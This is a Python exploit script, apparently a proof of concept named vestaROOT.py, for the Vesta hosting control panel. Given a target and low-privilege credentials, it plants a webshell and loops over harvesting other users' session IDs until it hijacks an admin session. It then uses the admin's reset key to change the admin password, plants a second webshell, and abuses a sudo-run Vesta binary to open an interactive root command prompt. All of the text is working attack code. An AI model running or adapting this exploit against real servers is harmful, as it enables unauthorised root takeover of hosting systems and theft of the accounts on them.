from VestaFuncs import *
import sys
import time
period = 0.5
if len(sys.argv) == 4:
    targetHost = sys.argv[1]
    targetUser = sys.argv[2]
    targetPass = sys.argv[3]
else:
    print("Usage\npython3 vestaROOT.py https://target_host:8083 user_login user_pass")
    exit()
ipFromHostname = getIPfromHostname(targetHost)
pwnDomain      = get_random_string().lower()+'.poc'
pwnDomainAdmin = get_random_string().lower()+'.poc'
while True:
    ## init user session
    uus = requests.Session()
    ## Login
    if login(uus,targetHost,targetUser,targetPass):
        usID  = uus.cookies.get_dict()['PHPSESSID']
        ## Check own webshell
        if getWebshell(uus,targetHost,pwnDomain,targetUser,ipFromHostname):
            ## Get other sessions IDs
            oSessIDs = getSessIDs(uus,targetHost,usID)
            if oSessIDs:
                print('[+] Obtained Sessions list : '+str(len(oSessIDs)))
                ## Check other sessions IDs
                adminSession = checkSessions(uus,targetHost,ipFromHostname,oSessIDs,pwnDomain)
                ## Admin session found
                if(adminSession):
                    adminJSON = json.loads(adminSession[1])
                    ## Reset key found
                    if adminJSON['data']['RKEY']:
                        ## Change admin password
                        print('[+] admin RKEY '+adminJSON['data']['RKEY'])
                        newAdminPassword = resetPassword('admin',targetHost, adminJSON['data']['RKEY'])
                        if(newAdminPassword):
                            print('[+] New admin account password ' +newAdminPassword)
                            ## Login as admin
                            uus2 = requests.Session()
                            if login(uus2,targetHost,'admin',newAdminPassword):
                                ## Check own webshell
                                uWebshell = getWebshell(uus2,targetHost,pwnDomainAdmin,'admin',ipFromHostname)
                                logout(uus2,targetHost)
                                if 'admin' in queryWebshell('echo `whoami` ;',ipFromHostname,pwnDomainAdmin):
                                    queryWebshell('`mkdir -p ./func;echo "bash -c \\"\\\\$1\\"\nexit" > ./func/main.sh;` ;',ipFromHostname,pwnDomainAdmin)
                                    while True:
                                        print(queryWebshell('echo `VESTA=$(pwd) sudo /usr/local/vesta/bin/v-list-backup-host "'+input('# ').replace('"','\\"')+'"`;',ipFromHostname,pwnDomainAdmin))
                                else:
                                    print('[!] Admin webshell not found ??')
                        else:
                            print('[!] admin password reset failed')
                    else:
                        print('[!] RKEY not found??')
            else:
                print('[!] no admin session found, restarting ..')
        ## Logout
        logout(uus,targetHost)
        time.sleep(period)
